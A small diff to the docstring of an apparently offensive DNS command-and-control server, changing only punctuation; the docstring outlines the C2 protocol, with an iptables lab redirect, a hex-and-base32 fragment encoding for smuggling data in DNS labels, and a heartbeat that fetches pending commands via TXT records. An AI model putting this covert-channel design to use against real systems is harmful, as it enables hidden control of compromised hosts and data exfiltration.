@@ -1,10 +1,10 @@
-"""DNS C2 server — authoritative TXT resolver for oxide c2 zone.
+"""DNS C2 server: authoritative TXT resolver for oxide c2 zone.
 UDP :10053. Lab: iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 10053
 
 Fragment format:
   label 1: {session_6hex}{total_2hex}{idx_2hex}  (10 chars)
   label 2: BASE32NOPAD(fragment_bytes)
-  Heartbeat: total=00, idx=00 → return pending command in TXT
+  Heartbeat: total=00, idx=00 -> return pending command in TXT
 """
 
 import base64
